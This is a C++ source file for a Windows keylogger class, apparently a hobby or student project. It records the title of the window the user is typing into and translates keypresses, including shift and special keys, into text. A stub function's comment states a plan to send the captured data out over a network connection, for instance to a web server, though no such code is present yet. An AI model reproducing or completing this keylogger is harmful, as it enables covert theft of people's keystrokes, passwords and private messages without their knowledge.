#include "KeyLogger.h"
/*
The below allows us to access data on keypressesand windows
ran into problems including winuser.h directly due to winnt.h
https://stackoverflow.com/questions/257134/weird-compile-error-dealing-with-winnt-h
*/

// if the macro doesn't exist yet, include wtypes.h

// for implementing a 5 minute timer very simply
#include <ctime>
#include <stdlib.h>

std::string KeyLogger::returnForegroundWindow(HWND newWin)
{
	/*
	Retrieves the name of the window the user is typing into
	*/
	char winName[301];
	GetWindowTextA(newWin, winName, 301);
	std::cout << "window changed to " << winName << std::endl;
	return winName;
}

void KeyLogger::dataToOut(/*params will be keypress data and currently active window*/)
{
	/*
	Called whenever data needs to be outputted
	Starting with a basic text file to begin with but will eventually output data straight through connection
		a web server may be the easiest way to do this
	*/
}

std::string KeyLogger::returnChar(char c) 
{
	bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) ? true : false;
	switch (c)
	{
	case VK_CAPITAL:
		return "!caps!";
	case VK_SPACE:
		return "!space!";
	case VK_BACK:
		return "!backsp!";
	case VK_RETURN:
		return "!enter!";
	case -69:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "+";
	case -36:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "\\";
	case VK_SUBTRACT:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "-";
	case -66:
		if (shiftPressed)
			std::cout << "!shift!+";
		return ".";
	case -65:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "/";
	case -70:
		if (shiftPressed)
			std::cout << "!shift!+";
		return ";";
	case -64:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "'";
	case -37:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "[";
	case -35:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "]";
	case -67:
		if (shiftPressed)
			std::cout << "!shift!+";
		return "-";
	case -68:
		if (shiftPressed)
			std::cout << "!shift!+";
		return ",";
	default:
		int cAsInt = (int)c;
		std::string ch(1, c);
		// a temporary solution to the shift key not being captured- i dont like it but getkeystate is delayed
		if (cAsInt == -96 || cAsInt == -95) 
		{ 
			return "!shift_or_accented_a!";
		}
		else if (shiftPressed) 
		{
			if (std::isalpha(ch[0])) 
			{
				// return character as is- capital
				return ch;
			}
			std::cout << "!shift!+";
			// i could have also returned the character entered when pressing shift with digits; this is different from us to uk
		}
		ch = tolower(c);
		return ch;
	}
}